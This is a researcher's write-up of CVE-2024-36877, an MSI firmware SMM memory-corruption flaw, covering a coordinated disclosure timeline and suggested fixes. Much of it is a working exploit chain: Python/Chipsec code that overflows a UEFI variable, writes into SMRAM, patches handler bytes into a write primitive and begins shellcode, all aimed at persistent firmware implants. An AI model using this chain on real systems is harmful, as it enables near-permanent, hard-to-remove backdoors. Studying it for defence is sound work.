---
# Page settings
layout: default
keywords: SMM, exploitation, persistence, MSI, ring -2

# Hero section
title: 'At Home In Your Firmware: Analysis of CVE-2024-36877'
description: 'SMM Memory Corruption Vulnerability in MSI firmware'
---
![At Home In Your Firmware: Got Any SMMacks?](/doks-theme/assets/images/at-home.jpeg)

## Summary

##### SMM memory corruption vulnerability in MSI SMM driver (SMRAM write)

A buffer overflow vulnerability was discovered which allows an attacker to execute arbitrary code.

#### Vulnerability Information

MITRE assigned CVE identifier: **CVE-2024-36877**

CVSS v3.1 Score 8.2 High AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

Affected MSI chipsets with confirmed impact by MSI PSIRT:

- Intel 300
- Intel 400
- Intel 500
- Intel 600
- Intel 700
- AM4
- AM5

#### Disclosure Timeline

| Activity    | Date |
| -------- | ------- |
| CVE request filed with MITRE  | 2024-05-29    |
| MSI PSIRT is notified | 2024-05-29     |
| MITRE assigns CVE number    | 2024-05-31    |
| MSI PSIRT confirms vulnerability    | 2024-06-04   |
| MSI PSIRT requests analysis of new firmware to confirm remediation | 2024-06-25
| Firmware validated to contain fixes for the reported vulnerability | 2024-06-30
| MSI PSIRT sets public disclosure date | 2024-07-12
| Public disclosure date | 2024-08-09

_You can skip the technical details and [get the POC](https://github.com/jjensn/CVE-2024-36877) on GitHub._

## Intro: System Mangement Mode (SMM)

System Management Mode (SMM) is a highly privileged operating environment that runs the firmware's most sensitive code. It exists on all x86 processors and it operates independently of the operating system. SMM provides an isolated execution environment where critical firmware operations take place (such as power management functions or live updating the system's BIOS). SMM code (and data) are stored in a special area of memory called SMRAM that is separate from the main system memory. This section of memory is unreadable and unwritable by the CPU unless it explicitly switches to System Management Mode - making it a great place for red teams to deploy undetected payloads.

Modern operating systems support communication with SMM modules (on Windows, this can be done through a kernel driver). Much like a driver's IOCTL code, SMM modules allocate themselves a unique identifier (typically 1-255) during firmware initialization, and designate a handler function that the firmware will call when the SMI code is signaled.

Invoking an SMI handler from kernel space is relatively straightforward:

<div class="example">
</div>
```
static
NTSTATUS
SendSMI (UCHAR smi_code)
{
    KAFFINITY affinity;
    affinity = KeSetSystemAffinityThreadEx(static_cast<KAFFINITY>(1));
    __outbyte(0xb2, smi_code);
    KeRevertToUserAffinityThreadEx(affinity);
    return STATUS_SUCCESS;
}
```

Meaning, if a vulnerability did exist, triggering it and gaining code execution in SMRAM can all be done directly from the OS! 

![You Are Here](/doks-theme/assets/images/ring-2.png)

Code executing in SMM has full read and write access to the entire range of physical memory, the devices attached to the motherboard, and the flash ROM itself. Simply put, the motherboard's flash chip can be re-written and allow permanent persistence regardless if the machine is reformatted. Once persistence is established, an implant would be able to intercept and inject itself into all future BIOS updates, making **removal only possible with a hardware flash programmer**.

##### Oh, The Possibilities!
If this is the first time you are reading about SMM, you are probably saying, _"OK, writing itself to the firmware is cool, but what can it actually do?"_

Code in SMRAM is started before the operating system is started. And as the OS begins to load itself into memory, SMM modules have the ability to modify that code (or security policies!) as they see fit, without any concern of being detected.

An SMM module has the ability to:

- Drop files on disk and execute them on startup
- Add its custom driver signer to the system's code integrity policy, allowing the author's own kernel drivers to be loaded at any time
- Start any driver (even unsigned) as an ELAM driver 
- Allocate code pages in UEFI memory and start a DPC to execute it at regular intervals. Processless (floating) code execution outside of OS memory!
- Disable PatchGuard and other security protections
- Inject and execute code in any process, including the kernel

Alex Ionescu said it best in his 2018 OffensiveCon presentation:

![Alex Bootkits?](/doks-theme/assets/images/alex_slides_1.PNG)

## Time To Get Technical

The rest of this writeup is for readers who have understanding of the complex world of UEFI and a background in reverse engineering x64 binaries.

The target: my late 2022 gaming desktop with an **MSI PRO Z690-A WIFI** motherboard and an **Intel 12th Gen** (Alder Lake) CPU.

It is running the latest BIOS version, one from April 2024.

### The Goal: Persistance, Like A Nation-State

The scenario: A junior system admin at a Fortune 500 downloads and installs a pirated piece of software with a malicious payload implanted in it. Upon execution, it drops a [vulnerable driver](https://decoded.avast.io/luiginocamastra/from-byovd-to-a-0-day-unveiling-advanced-exploits-in-cyber-recruiting-scams/) and manually maps an unsigned driver into memory.

The driver then exploits an SMM vulnerability and writes a payload to the target's BIOS for true persistence.

_Or hey ... rent a physical machine at a datacenter for a month and install a UEFI backdoor sounds nice, too. (because who physically reflashes a BIOS for each new customer?!)_

The first part is easy - the second part, identifying and exploiting an SMM vulnerability - not so much.

### Tools Needed For Vulnerability Research
- ~~A FlashCat SPI Programmer~~
- Actually, you can just use the tool in the BIOS to flash
- A custom compiled version of Dmytro Oleksiuk's (Cr4sh) [SmmBackdoor (v1)](https://github.com/Cr4sh/SmmBackdoor)
- [My fork](https://github.com/jjensn/smram_parse) of Cr4sh's smram_parse.py script
- [UEFITool (latest)](https://github.com/LongSoft/UEFITool/releases/download/A67/UEFITool_NE_A67_win64.zip)
- [UEFITool v0.28.0](https://github.com/LongSoft/UEFITool/releases/download/0.28.0/UEFITool_0.28.0_win32.zip)
- Disassembler of choice
- [Chipsec](https://github.com/chipsec/chipsec) & its compiled Windows driver installed on the target
- A USB flash drive (with Chipsec UEFI support)
- Python3 
- Visual Studio 2022

#### Optional But Nice To Have
- [PCIScreamer.M2](https://shop.lambdaconcept.com/home/50-screamer-pcie-squirrel.html): Read and write physical memory on the target machine. Very helpful during debugging when I inevitably lock the target machine up and want to read debug messages to figure out where things went wrong.


### Chipsec Initial Scan Results
`SMM_Code_Chk_En` is enabled, so exploitation will take much more of an effort since SMM can't call any code outside of SMRAM. I will touch on this later.

<div class="example">
</div>
```
[*] Running module: chipsec.modules.common.smm_code_chk
[x][ =======================================================================
[x][ Module: SMM_Code_Chk_En (SMM Call-Out) Protection
[x][ =======================================================================
[*] MSR_SMM_FEATURE_CONTROL = 0x00000005 << Enhanced SMM Feature Control (MSR 0x4E0 Thread 0x0)
    [00] LOCK             = 1 << Lock bit 
    [02] SMM_Code_Chk_En  = 1 << Prevents SMM from executing code outside the ranges defined by the SMRR 
[*] MSR_SMM_FEATURE_CONTROL = 0x00000005 << Enhanced SMM Feature 
...
[+] PASSED: SMM_Code_Chk_En is enabled and locked down
```

However, the BIOS region wasn't write protected from the factory, so a bit anticlimactic since an exploit isn't even needed to gain true persistence:

<div class="example">
</div>
```
[*] Running module: chipsec.modules.common.bios_wp
[x][ =======================================================================
[x][ Module: BIOS Region Write Protection
[x][ =======================================================================
[*] BC = 0x10000888 << BIOS Control (b:d.f 00:31.5 + 0xDC)
    [00] BIOSWE           = 0 << BIOS Write Enable 
    [01] BLE              = 0 << BIOS Lock Enable 
    [02] SRC              = 2 << SPI Read Configuration 
    [04] TSS              = 0 << Top Swap Status 
    [05] SMM_BWP          = 0 << SMM BIOS Write Protection 
    [06] BBS              = 0 << Boot BIOS Strap 
    [07] BILD             = 1 << BIOS Interface Lock Down 
    [11] ASE_BWP          = 1 << Async SMI Enable for BIOS Write Protection 
[-] BIOS region write protection is disabled!
```

<div class="example">
</div>
```
[*] Running module: chipsec.modules.common.spi_desc
[x][ =======================================================================
[x][ Module: SPI Flash Region Access Control
[x][ =======================================================================
[*] FRAP = 0x0000FFFF << SPI Flash Regions Access Permissions Register (SPIBAR + 0x50)
    [00] BRRA             = FF << BIOS Region Read Access 
    [08] BRWA             = FF << BIOS Region Write Access 
    [16] BMRAG            = 0 << BIOS Master Read Access Grant 
    [24] BMWAG            = 0 << BIOS Master Write Access Grant 
[*] Software access to SPI flash regions: read = 0xFF, write = 0xFF
[-] Software has write access to SPI flash descriptor

[-] FAILED: SPI flash permissions allow SW to write flash descriptor
[!] System may be using alternative protection by including descriptor region in SPI Protected Range Registers
```

Regardless, SMM exploitation and bootkits have always fascinated me and ever since I read that they were in use by nation-state actors, I wanted one to call my own.

## Analysis I: Dumping BIOS and SMRAM

To start analyzing the SMM modules, dump the BIOS with Chipsec (it can also be obtained [directly from the manufacturer's website](https://download.msi.com/bos_exe/mb/7D25v1H.zip)).

Boot into the UEFI shell from the Chipsec USB drive and run:

`chipsec_util spi dump firmware.bin`

Now would be a good time to install Dmytro Oleksiuk's (Cr4sh) SmmBackdoor: it can read SMRAM (which will be needed to debug any potential vulnerabilities) and dump the contents for better analysis—much easier than playing reverse engineering whack-a-mole with 100's of different SMM modules. I had no luck using it in 'payload' mode, so I ended up inserting it directly into my firmware image and flashing the new image to the BIOS.

### Physically Flashing The New Image
On the subject of flashing the BIOS—I discovered that the TPM headers can be used as JSPI. This is far less hassle than connecting a SOIC8 clip—especially since the target motherboard's ROM chip is a Macronix `MX25U25635G` and too low profile for a clip (and I am certainly not desoldering it off).

Here's the pinout I followed (credit: some [amazing dude](https://forum-en.msi.com/index.php?threads/msi-z370-sli-plus-jspi1-pinout-for-bios-flash-using-raspberry-pi-zero.319596/post-1822652) on the MSI forums):

![JTPM1 as JSPI1](/doks-theme/assets/images/JSPI.png)

I ended up not needing two GNDs and two VCCs—VCC on pin1 and GND on pin8 worked fine (3.3v).

![JTPM1](/doks-theme/assets/images/JTPM.png)

Once booted back up, dump the contents of SMRAM to disk:

`python SmmBackdoor.py --dump-smram`

The SMRAM dump needs to be analyzed using a modified version of Cr4sh's smm_parse script (the original didn't work for my dump and he never accepted [my PR](https://github.com/Cr4sh/smram_parse/pull/1) eons ago—though that too is now out of date; see tools above for the latest version):

`python smm_parse.py ..\SMRAM_dump_4a000000_4affffff.bin F:\firm-infected-base-latest.bin`

<div class="example">
</div>
```
[+] SMRAM is at 0x4a000000:4afffffe
[+] EFI_SMM_SYSTEM_TABLE2 is at 0x4affc400

SMI ENTRIES:

LOADED SMM DRIVERS:

...snip...
0x4aa31000: size = 0x00009000, ep = 0x4aa322e0, name = MsiApServiceSmi
...more...

ERROR: Unable to find prte entry

[+] Found SWSM structure at offset 0x9f2f98

SW SMI HANDLERS:
... many others ..
0x4aa3fa98: SMI = 0xe3, addr = 0x4aa33584, image = MsiApServiceSmi
...more...

ERROR: Unable to find smih entry

[+] Found smie structure at offset 0x9eb518

SMI HANDLERS:
...

NOTES:

 * - SW SMI handler uses ReadSaveState()/WriteSaveState()
 ```

There are a lot of modules with multiple SW SMI handlers—and I painstakingly looked through all of them.

Eventually, I landed on one that caught my attention.

## Analysis II: The Vulnerable Handler

Module: **MsiApServiceSmi**

SMI: `0xe3`, addr: `0x4aa33584`, base: `0x4aa31000`

Handler pseudo-code:

<div class="example">
</div>
```
// SMI HANDLER 0xE3 - FUNCTION START
// 
v4 = *Context == 0xE3;
v5 = 0i64;
Attributes = 0;
if ( !v4 )
  return v5;

DataSize[0] = 2i64;
v6 = (gRT->GetVariable("ApServiceAuthority", &EFI_SETUP_VARIABLE_GUID, 0i64, DataSize, &Data) & 0x8000000000000000ui64) != 0i64 || Data != 0;

// Re-init of the data size variable to prevent overflow (good!)
DataSize[0] = 2i64;
gRT->GetVariable("ApServiceAuthority", &EFI_SETUP_VARIABLE_GUID, 0i64, DataSize, &Data);

result = g_SetVarPtrs(); // This call is referenced later in the post when I begin building the exploit chain. It's true purpose isn't all that important.

if ( result >= 0 ) 
{
  WMIDataSize = 0i64;

  // Get the size of the variable (without assigning it)
  // Note: this is attacker controlled
  v5 = gRT->GetVariable("WMIAcpiMemAddr", &EFI_SETUP_VARIABLE_GUID, &Attributes, &WMIDataSize, 0i64);
  
  // WMIDataSize now is set to the length of the value of WMIAcpiMemAddr

  // The second call to GetVariable re-uses WMIDataSize without validating its size!
  // pWMIAcpiMemAddr is meant to be a pointer to a physical address, so the expectation is that it will be only 8 bytes. An opportunity to overflow!

  if ( v5 != 0x8000000000000005ui64
    || (result = gRT->GetVariable("WMIAcpiMemAddr", &EFI_SETUP_VARIABLE_GUID, &Attributes, &WMIDataSize, &pWMIAcpiMemAddr),
        v5 = result,
        result >= 0) )
  {
    pWMIAcpiMemAddrCpy = (__int64)pWMIAcpiMemAddr;
    if ( v6 && (pWMIAcpiMemAddr->byte0 != 32 || (unsigned int)(pWMIAcpiMemAddr->dword5 - 3) > 1) )
    {
      // This function is monumental during the exploitation development - I will circle back here shortly.
      fnWriteStatusToMemory("Access Denied", &pWMIAcpiMemAddr->status);
      return v5;
    }
    v8 = 0i64;

    // Count the number of bytes at pWMIAcpiMemAddr->status, stopping when a null-byte is encountered
    if ( pWMIAcpiMemAddr->status )
    {
      v9 = &pWMIAcpiMemAddr->status;
      do
      {
        ++count;
        ++v9;
      }
      while ( *v9 );
    }

    // Zero out pWMIAcpiMemAddr->status, assuming its a wide-char (hence why count is doubled)
    fnResetWideString(&pWMIAcpiMemAddr->status, 2 * count, 0i64);
  }
  ...remainder of function omitted...
}
```

### Vulnerability I: Misuse of GetVariable Leading to Overflow

##### The Problem
`gRT->GetVariable` does not statically set `DataSize` when retrieving the variable `WMIAcpiMemAddr`.

An initial call to `gRT->GetVariable` is made to determine the size of the `WMIAcpiMemAddr` variable.

A second call to `gRT->GetVariable` then passes that value and stores the variable contents in `pWMIAcpiMemAddr`.

This variable is unprotected and, while not ... _easily_ writable from Windows due to it missing the **NON_VOLATILE** flag, it is indeed writable from other places (EFI shell for sure). But if one were so inclined to keep it strictly Windows, a kernel patch here might work:

<div class="example">
</div>
```
__int64 __fastcall HalSetEnvironmentVariableEx(const wchar_t *a1, int a2, __int64 a3, int a4, int a5)
{
  ...snip...
  if ( (a5 & 1) == 0 )
    return 0xC000000Di64;
  ...snip...
}
```

It will trigger PatchGuard, but the variable only needs to be deleted and then recreated with the attributes set to `NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS` once. After that, it won't be reset every reboot.

##### The Result
If the variable `WMIAcpiMemAddr` is larger than 8 bytes, it will overflow, allowing an attacker to write data to the data segment of the module.

Since `WMIAcpiMemAddr` is controllable by an attacker, the attacker also controls the memory underneath `pWMIAcpiMemAddr`, which includes a lot of great pointers ripe for exploitation:

```
; struct_pWMIAcpiMemAddr *pWMIAcpiMemAddr
.data:000000004AA34710 pWMIAcpiMemAddr dq 0                    ; DATA XREF: SwSmiHandler+E1↑o
.data:000000004AA34710                                         ; SwSmiHandler:loc_4AA3369D↑r
.data:000000004AA34718 pWMIAcpiMemAddrCpy dq 0                 ; DATA XREF: sub_4AA32668:loc_4AA326F9↑r
... SNIP ...
.data:000000004AA34738 ; _EFI_SMM_SYSTEM_TABLE2 *gSmst
.data:000000004AA34738 gSmst_0         dq 0                    ; DATA XREF: sub_4AA32368+41↑o
... SNIP ...
.data:000000004AA34768 ; BOOLEAN gInSmram
.data:000000004AA34768 gInSmram        db 0                    ; DATA XREF: sub_4AA32368:loc_4AA3261F↑o
.data:000000004AA34769                 db    0
.data:000000004AA3476A                 db    0
.data:000000004AA3476B                 db    0
.data:000000004AA3476C                 db    0
.data:000000004AA3476D                 db    0
.data:000000004AA3476E                 db    0
.data:000000004AA3476F                 db    0
.data:000000004AA34770 ; EFI_RUNTIME_SERVICES *gRT
.data:000000004AA34770 gRT             dq 0                    ; DATA XREF: sub_4AA32A08+21↑r
.data:000000004AA34770                                         ; sub_4AA32A08+90↑r ...
.data:000000004AA34778 ; _EFI_SMM_SYSTEM_TABLE2 *gSmst_0
.data:000000004AA34778 gSmst_1         dq 0                    ; DATA XREF: sub_4AA32BDC+C↑r
... LOTS OF ROOM DOWN HERE ...
```

##### The Exploit
Python pseudo-code using Chipsec:

<div class="example">
</div>
```
class WMIPayload(ctypes.LittleEndianStructure):
  _pack_ = 1
  _fields_ = [
    ("WmiACPIMemAddress", ctypes.c_uint64),        # 0x0000
    ("WmiACPIMemAddressCpy", ctypes.c_uint64),     # 0x0008
    ("pad_0010", ctypes.c_char * 24),              # 0x0010
    ("gSMST_0", ctypes.c_uint64),                  # 0x0028
    ("pad_0030", ctypes.c_char * 40),              # 0x0030
    ("InSmram", ctypes.c_uint64),                  # 0x0058
    ("gSMRT", ctypes.c_uint64),                    # 0x0060
    ("gSMST_1", ctypes.c_uint64),                  # 0x0068
  ]
    ...

def set_wmi_var(data):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    bytes(data),
    ctypes.sizeof(data),
    7,
  )

  if status != 0:
    print("Failed to set WMIAcpiMemAddr variable!")
    exit(1)

overflow = WMIPayload()
overflow.gSMRT = 0xDEADBEEF

set_wmi_var(overflow)

// fire handler which calls GetVariable, which will cause pWMIAcpiMemAddr to overflow
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

// the next call to SMI handler 0xE3 will call 0xDEADBEEF->GetVariable instead of gRT->GetVariable
// so, if one were able to write shellcode to that address, then redirecting execution would be achieved
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

##### The Fix
- Statically set `DataSize` to 8 if writing status messages to physical memory is a requirement.
- OR check the value of `DataSize` after the initial call to `GetVariable`, return if greater than 8.

### Vulnerability II: Arbitrary Write To Physical Memory (including SMRAM)

##### The Problem

The attacker-controlled `WMIAcpiMemAddr` variable is never validated - leading to two arbitrary SMM write primitives.

```
fnWriteStatusToMemory("Access Denied", &pWMIAcpiMemAddr->status);
```

```
fnResetWideString(&pWMIAcpiMemAddr->status, 2 * v8, 0i64);
```

##### The Result

An attacker who controls the contents of the `WMIAcpiMemAddr` variable can leverage the two functions above to write data at `pWMIAcpiMemAddr->status` _(pWMIAcpiMemAddr+0x79)_, leading to SMRAM corruption.

If the variable `ApServiceAuthority` exists and is zero, `fnResetWideString` will zero out the memory at pWMIAcpiMemAddr+0x79 (until it finds 0x0 0x0).

If the variable `ApServiceAuthority` does not exist, **" Access Denied"** will be written to pWMIAcpiMemAddr+0x79 via `fnWriteStatusToMemory`.

##### The (Basic) Exploit

Python pseudo-code using Chipsec:

<div class="example">
</div>
```
def smm_write(addr):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    (addr - 0x79).to_bytes(8, "little"),
    8,
    7,
  )

  if status != 0:
    print("Failed to set WMIAcpiMemAddr!")
    exit(1)

  status = self.cs.helper.delete_EFI_variable(
    "ApServiceAuthority", "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9"
  )

  if status != 0:
    print("Failed to delete ApServiceAuthority!")
    exit(1)

// Set UEFI variable WMIAcpiMemAddr to SMRAM base
smm_write(0x4a000000)

// call handler to write " Access Denied" to SMRAM base
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

##### The Fix
- EDK2 provides a method to validate if an address is outside of SMRAM - `SmmIsBufferOutsideSmmValid`. If the address is within the bounds of SMRAM, return.

## Chaining Vulnerabilities For Code Execution
With the two vulnerabilities above, there now exists a way to:
- Copy data into SMRAM memory (Vulnerability I)
- Zero out memory (Vulnerability II)
- Write arbitrary data to any address (also Vulnerability II)

##### Preparing Write Primitive

On the surface, ***fnWriteStatusToMemory*** appears to be a straightforward way to write to memory - but turning into a true write-primitive took a bit of effort. Honestly, it was a lot of sleepless nights and wasted weekends.

`fnWriteStatusToMemory` pseudo-code:

<div class="example">
</div>
```
char __fastcall fnWriteStatusToMemory(char *sStatusMsg, _WORD *DestAddress)
{
  unsigned __int8 v2; // r9
  char result; // al
  __int64 v4; // r8

  v2 = 0;
  *DestAddress = 0x20; // ' '
  result = *sStatusMsg;
  if ( *sStatusMsg )
  {
    v4 = 0i64;
    do
    {
      ++v2;
      DestAddress[v4 + 1] = result;
      v4 = v2;
      result = sStatusMsg[v2];
    }
    while ( result );
  }
  return result;
}
```

_Note that 0x20 is the hex representation of ASCII space._ 

This function iterates over `sStatusMsg` and writes its contents as a wide-string (_this is important!_) to `DestAddress`, then returns.

What if `sStatusMsg` were NULL? This function would instead just write two bytes: `0x20 0x00` and return. Since two bytes are far easier to work with than the wide " Access Denied", it put me one step closer to having a write-primitive I could work with.

Fortunately, zeroing out an address exists in the second vulnerability using `fnResetWideString` - provided the attacker-controlled UEFI variable `ApServiceAuthority` exists and its value is zero.

```
41 63 63 65 73 73 20 64 65 6E 69 65 64 00       aAccessDenied   db 'Access denied',0 
00 00 00 00 00 00 00 00 00 00                   align 10h
```

From the SMRAM dump, I know MSIApServiceSmi module's base address is `0x4aa31000`. "Access Denied" is at `base+0x35D8`:

<div class="example">
</div>
```
def set_zeros(self, addr):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    (addr - 0x79).to_bytes(8, "little"),
    8,
    7,
  )

  if status != 0:
    print("(set_zeros) Failed to set WMIAcpiMemAddr!")
    exit(1)

  self.cs.helper.set_EFI_variable(
    "ApServiceAuthority",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    b"\x00\x00",
    2,
    7,
  )

  if status != 0:
    print("(set_zeros) Failed to set ApServiceAuthority!")
    exit(1)

  self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

self.set_zeros(0x4aa31000+0x35D8) // base + offset
```

Resulting in:

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00       aAccessDenied   db '0','0','0','0'...
00 00 00 00 00 00 00 00 00 00                   align 10h
```

With `Access Denied` now NULL, an arbitrary write of `0x20 0x00` (wchar_t, remember?) to any address is possible. 

I mentioned `SMM_Code_Chk_En` earlier when discussing the Chipsec scan results, and it's important now.

`SMM_Code_Chk_En` is a CPU security feature that prevents code-execution from leaving SMRAM (an SMM callout). When enabled, the CPU will lock if an instruction calls a non-SMRAM address.

My first thought is that I would be able to find an instruction where updating its address from, let's say `call 0xFEEDBEEF` to `call 0xFEED2000` could work in my favor. With `SMM_Code_Chk_En`, a lot of conditions have to be met for that to work:

- 0xFEED2000 is in SMRAM
- I have to be able to write shellcode to 0xFEED2000
- I have to be able to call the function that calls 0xFEED2000 (via an SMI handler, or other method)

These conditions didn't exist, or at least, I couldn't find a good candidate. As such, just being able to write `0x20 0x00` anywhere was less than ideal.

Instead, I decided to leverage the `GetVariable` overflow to write my own data, which I can then pass to `fnWriteStatusToMemory`.

##### Building A Better Write Primitive

If you recall, `fnWriteStatusToMemory` prepends all its writes with a wide space:

```
fnWriteStatusToMemory("my_shellcode", 0xFEEDBEEF);
```

Results in " my_shellcode" being written to 0xFEEDBEEF.

Having `0x20 0x00` prepended to every write really limits the options on what can be written and where. And certainly no working shellcode (0x20 0x00 is not a valid instruction). That needs to be disabled.

Here is the assembly for the vulnerabile SMI handler, prior to it calling `fnWriteStatusToMemory`:
```                       
48 8D 51 79            lea     rdx, [rcx+79h]
48 8D 0D 0D 0F 00 00   lea     rcx, aAccessDenied ; "Access denied"
E8 68 EF FF            call    fnWriteStatusToMemory
```

Using the `0x20 0x00` primitive, I turn 

```
48 8D 0D 0D 0F 00 00   lea     rcx, aAccessDenied ; "Access denied"
```

into:

```
48 8D 0D 0D [20 00] 00   lea     rcx, byte_4AA356D8
```

I do this now because I need a way to disable the writing of the wide-byte portion of `fnWriteStatusToMemory` and will need this functionality later.

Now, anything at address `0x4AA356D8` will be written (as a wide string) to `pWMIAcpiMemAddr->status`. Luckily, **0x4AA356D8** is lower in memory than **0x4AA34710** (the address of pWMIAcpiMemAddr).

Overflowing the `WMIACPIMemAddress` variable, I can set 0x4AA356D8 to whatever value I need by adjusting the WMIPayload struct I used previously:

_0x4AA356D8 - 0x4AA34710 (address of pWMIAcpiMemAddr) = **0xFC8**_

The new WMIPayload struct:

<div class="example">
</div>
```
class WMIPayload(ctypes.LittleEndianStructure):
  _pack_ = 1
  _fields_ = [
    ("WmiACPIMemAddress", ctypes.c_uint64),        # 0x0000
    ("WmiACPIMemAddressCpy", ctypes.c_uint64),     # 0x0008
    ("pad_0010", ctypes.c_char * 24),              # 0x0010
    ("gSMST_0", ctypes.c_uint64),                  # 0x0028
    ("pad_0030", ctypes.c_char * 40),              # 0x0030
    ("InSmram", ctypes.c_uint64),                  # 0x0058
    ("gSMRT", ctypes.c_uint64),                    # 0x0060
    ("gSMST_1", ctypes.c_uint64),                  # 0x0068
    ("pad_0070", ctypes.c_char * 3928),            # 0x0070 // 3928 byte padding
    ("Primitive", ctypes.c_byte * 8),              # 0x0FC8 // 0x4AA356D8
  ]
```

There is a caveat—stomping over 0xFC8 bytes starting at the address of `pWMIAcpiMemAddr` means I overwrite one really important pointer—`gRT` (the SMRAM version of runtime services)—which is called at the beginning of the SMI handler (`gRT->GetVariable`). Unfortunately, this pointer isn't leaked anywhere, and so it has to be hard-coded for each BIOS version (it's static). I can't change the `gRT->GetVariable` call either, as it's needed for future steps during the chain. A read-primitive vulnerability would be needed to make this universal; for the POC though, hard-coding the pointer will work just fine.


Here is the assembly for `fnWriteStatusToMemory`:

```
5D               	  pop     rbp   // byte 1
C3               	  retn          // byte 2
                 	  ; end of sub_4AA32368
                    ; fnWriteStatusToMemory start
B8 20 00 00 00   	  mov     eax, 20h ; ' '
45 32 C9         	  xor     r9b, r9b
66 89 02         	  mov     [rdx], ax
8A 01            	  mov     al, [rcx]
84 C0            	  test    al, al
74 1B            	  jz      short locret_4AA32664
45 33 C0         	  xor     r8d, r8d
                 	  loc_4AA3264C:
0F BE C0         	  movsx   eax, al
41 FE C1         	  inc     r9b
66 42 89 44 42 02	  mov     [rdx+r8*2+2], ax
45 0F B6 C1      	  movzx   r8d, r9b
41 8A 04 08      	  mov     al, [r8+rcx]
84 C0            	  test    al, al
75 E8            	  jnz     short loc_4AA3264C
                 	  locret_4AA32664:
C3               	  retn
                    ; g_WriteStatusMsg endp
```

I show the previous function prologue because those last two bytes are going to get replaced when I disable the writing of the wide-byte space. Good news is the function (`sub_4AA32368`) never gets called, so it doesn't impact anything important.

Two changes need to be made to stop 0x20 from ruining my hopes and dreams of SMM exploitation:

Line 1 at the top of the function: 

```
B8 20 00 00 00   mov     eax, 20h ; ' '
```

and line 3: 

```
66 89 02         mov     [rdx], ax
```

These two are responsible for moving 0x20 into RAX and then writing it as a wide byte.

It would be great if I could write NOPs over the two and be done with it, but no matter what, `mov     [rdx], ax` will always ensure the last byte either 0x00 or 0xFF, which will lead to the instruction looking something like:

```
90 90 90 90 FF  ; invalid instruction, crash imminent
```

Is there another NOP-like byte I can use ? 

Yes, actually. Meet my new friend `0x66`: the operand-size override prefix.

<div class="example">
</div>
```
def gen_bad_var_data(self, wmi_memaddr=None, write_primitive=None):
  wmipayload = self.WMIPayload()

  wmipayload.gSMRT = self.SMRT # needs to be hardcoded
  wmipayload.gSMST_0 = self.SMST # this pointer is leaked
  wmipayload.gSMST_1 = self.SMST # same
  wmipayload.InSmram = 1

  if wmi_memaddr is not None:
    wmipayload.WmiACPIMemAddress = wmi_memaddr - 0x79
    wmipayload.WmiACPIMemAddressCpy = wmi_memaddr - 0x79

  if write_primitive is not None:
    wmipayload.Primitive = (ctypes.c_byte * 8)(*write_primitive)

  return wmipayload

def disable_0x20(self):
  primitive = b"\x66\x00\x00\x00\x00\x00\x00"

  data = self.gen_bad_var_data(
      wmi_memaddr=self.MovEax20Address, # mov     eax, 20h ; ' '
      write_primitive=primitive,
  )

  self.set_wmi_var(data)

  self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```
The original:

`B8 20 00 00 00   mov     eax, 20h ; ' '` 

now turns into:

`66 00 00 00 00   data16 add BYTE PTR [rax],al` 

Do I have any idea what's in RAX when this function is first called? No, because debugging doesn't exist in SMM mode unless you sign a corporate NDA with Intel (_btw, Intel, hook a brother up_). But it doesn't crash and zeroes out RAX, which is all that matters.

Moving on to disabling line 3:

`66 89 02         mov     [rdx], ax`

<div class="example">
</div>
```
def disable_0x20(self):
    primitive = b"\x66\x00\x00\x00\x00\x00\x00"

    data = self.gen_bad_var_data(
        wmi_memaddr=self.MovEax20Address, # mov     eax, 20h ; ' '
        write_primitive=primitive,
    )

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

    # nothing other than 0x0 0x00 will be written with this set to null
    primitive = b"\x00\x00\x00\x00\x00\x00\x00"

    data = self.gen_bad_var_data(
        wmi_memaddr=self.MovRdxAxAddress, # mov [rdx], ax
        write_primitive=primitive,
    )

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

With RAX set to 0x0, I use the same trick, but this time, 0x66 is already in place, so I just need two 0x0 bytes—which I just happen to have already in RAX from the last step:

`66 89 02         mov     [rdx], ax`

becomes:

`66 00 00         data16 add BYTE PTR [rax],al`

And with that, the function will no longer write `0x20 0x00` at the start of `DestAddress` - putting me one step closer the finish line. I simply need to take into consideration that the function begins writing whatever data I want at +0x2 bytes from my target address (so, target-0x79-0x2).

To recap what's been changed so far:

- "Access Denied" was zero'd out in the module's `.data` segment, allowing for a two byte (0x20 0x00 write primitive)
- Using the 0x20 0x00 primitive, the address of the first parameter passed to `fnWriteStatusToMemory` was updated - there now exists a way to write any byte(s) at an attacker controlled address to another address (albeit as a wide byte)
- Using the new primitive above, `fnWriteStatusToMemory` was modified so that `0x20 0x00` is no longer prepended to the first parameter when the function is called

A few more changes need to be made to have a true write-where primitive, but the exploit is almost done!

##### A Real Memcpy, Please!

A limitation exists with `fnWriteStatusToMemory` and its write capabilities: it stops looping when it encounters `0x0` since it's purpose was to copy a string... and that just won't do.

But, if I can write memcpy-esque shellcode that has no 0x0 bytes, then I'm one step closer to firmware persistence.

Remember, I control RCX when `fnWriteStatusToMemory` is called, so only a little more creativity is needed.

Here's what I cooked up:

<div class="example">
</div>
```
0:  48 8b 01                mov    rax,QWORD PTR [rcx]
3:  48 8b 30                mov    rsi,QWORD PTR [rax]
6:  48 8b 78 08             mov    rdi,QWORD PTR [rax+0x8]
